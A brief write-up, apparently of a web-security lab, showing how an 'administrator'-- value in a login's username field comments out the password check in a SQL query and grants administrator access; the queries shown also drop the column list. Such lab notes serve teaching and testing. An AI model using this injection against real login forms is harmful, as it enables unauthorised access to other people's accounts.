Goal : is to bypass the password means login to administrator account without password

when we enter the username and the password the website run this sql query and login directly in the username and the password are correct :

SELECT FROM users WHERE username='theusername' and password='thepassword'

Solution : we don't have a password !

to login to the administrator account we should impass the password 
to do that : 

we add a comment sequence '-- with the administrator username which means impass the rest of the query
after the '--

SELECT FROM users WHERE username='administrator'-- and password='x'
